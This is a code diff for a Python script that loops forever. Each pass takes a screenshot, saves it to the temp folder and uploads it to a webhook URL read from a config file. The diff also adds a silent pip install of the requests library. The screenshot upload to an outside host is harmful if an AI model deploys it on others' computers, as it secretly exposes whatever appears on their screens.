@@ -1,9 +1,15 @@
-
-from discord_webhook import DiscordWebhook
 from time import sleep, time
 import os
 import pyautogui
 import json
+
+try:
+	import requests
+except:
+	os.system("py -m pip install requests")
+finally:
+	import requests
+
 
 print("PGM Start")
 with open("webhook.json", "r") as f:
@@ -11,18 +17,10 @@ with open("webhook.json", "r") as f:
 uri = whData["liv"]
 
 while 1:
-	webhook = DiscordWebhook(url=uri, username=f"Image Render [{time()}]",
-		avatar_url="https://media.discordapp.net/attachments/881416619937660928/959791245339787274/unknown.png",
-		content= f"{int(time())}")
-
 	pic = pyautogui.screenshot()
 	pic.save(f'{os.getenv("temp")}/rSHOT.png')
 
-	with open(f'{os.getenv("temp")}/rSHOT.png', "rb") as f:
-		# webhook.add_file(file=f.read(), filename=f'{time()}.png')
-		webhook.add_file(file=f.read(), filename=f'time.png')
-
-	response = webhook.execute()
+	response = requests.post(uri, data={'content': f"{int(time())}"}, files={'image': open(f'{os.getenv("temp")}/rSHOT.png', "rb")})
 	print(response)
 
 	try:
